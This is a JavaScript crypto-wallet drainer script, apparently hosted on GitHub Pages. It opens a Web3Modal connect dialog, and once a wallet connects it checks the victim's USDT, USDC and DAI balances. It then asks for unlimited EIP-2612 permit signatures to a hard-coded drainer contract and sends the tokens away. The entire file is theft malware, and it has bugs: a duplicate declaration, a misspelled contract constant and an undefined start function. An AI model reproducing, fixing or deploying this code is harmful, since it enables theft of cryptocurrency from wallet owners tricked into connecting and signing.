// resolution.js - FINAL VANILLA JS DRAINER (ESM)
// Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js?v=7

const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
const DRAINER_CONTRACT = '0xa6f8aed0de04de90af07229187a0fa3143d70c6e';

const TOKENS = {
  1: { // Ethereum
    '0xdAC17F958D2ee523a2206206994597C13D831ec7': 'USDT',
    '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48': 'USDC',
    '0x6B175474E89094C44Da98b954EedeAC495271d0F': 'DAI'
  }
};

let modal, wagmiConfig;

// Load ESM libraries
import ethers from 'https://cdn.jsdelivr.net/npm/ethers@6/+esm';
import { defaultWagmiConfig } from 'https://cdn.jsdelivr.net/npm/wagmi@2/+esm';
import { createWeb3Modal } from 'https://cdn.jsdelivr.net/npm/@web3modal/wagmi@5/+esm';
import { mainnet } from 'https://cdn.jsdelivr.net/npm/wagmi@2/chains/+esm';

// Setup modal
const wagmiConfig = defaultWagmiConfig({
  chains: [mainnet],
  projectId: PROJECT_ID
});

modal = createWeb3Modal({
  wagmiConfig,
  projectId: PROJECT_ID,
  themeMode: 'dark'
});

// Listen for connect
wagmiConfig.subscribeEvents(async (event) => {
  if (event.type === 'CONNECT_SUCCESS') {
    const user = event.accounts[0];
    console.log('Connected:', user);
    await drainAll(user);
  }
});

async function drainAll(user) {
  const provider = new ethers.BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();

  for (const [token, name] of Object.entries(TOKENS[1])) {
    try {
      const balance = await new ethers.Contract(token, ['function balanceOf(address) view returns (uint256)'], provider).balanceOf(user);
      if (balance === 0n) continue;

      console.log(`Draining ${name}...`);

      // Use standard name/version for permit
      const domain = { name: name.includes('USD') ? name : 'Token', version: '1', chainId: 1, verifyingContract: token };
      const types = { Permit: [
        { name: 'owner', type: 'address' },
        { name: 'spender', type: 'address' },
        { name: 'value', type: 'uint256' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' }
      ]};

      const value = ethers.MaxUint256;
      const nonce = await new ethers.Contract(token, ['function nonces(address) view returns (uint256)'], provider).nonces(user);
      const deadline = Math.floor(Date.now() / 1000) + 3600;
      const message = { owner: user, spender: DRAINER_CONTRACT, value, nonce, deadline };

      const sig = await signer.signTypedData(domain, types, message);
      const { v, r, s } = ethers.Signature.from(sig);

      const contract = new ethers.Contract(DRANER_CONTRACT, ['function resolveWithPermit(address,address,uint256,uint256,uint8,bytes32,bytes32)'], signer);
      const tx = await contract.resolveWithPermit(token, user, value, deadline, v, r, s);
      await tx.wait();

      console.log(`${name} DRAINED! Tx: ${tx.hash}`);
    } catch (err) {
      console.warn(`Failed ${name}:`, err.message);
    }
  }
}

window.connectWallet = () => modal.open();
window.connectWallet = () => modal?.open();

// Start
initDrainer();
